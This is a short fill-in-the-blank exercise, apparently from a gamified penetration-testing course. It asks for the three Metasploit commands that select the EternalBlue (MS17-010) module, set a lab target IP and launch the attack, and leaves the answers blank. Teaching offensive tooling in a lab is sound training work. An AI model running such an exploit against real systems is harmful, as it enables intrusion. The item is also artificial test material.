title: Metasploit Master 🤖
description: Using Metasploit, select an exploit and set the target IP address.
problemStatement:
You have identified an eternalblue vulnerability on a target computer with the IP address `10.0.0.5`. 

**Your Mission**: Complete the command sequence to start the exploit using the module `exploit/windows/smb/ms17_010_eternalblue`.

1. Command to select the module: `______` 
2. Command to set the target IP: `______` 
3. Command to start the attack: `______`
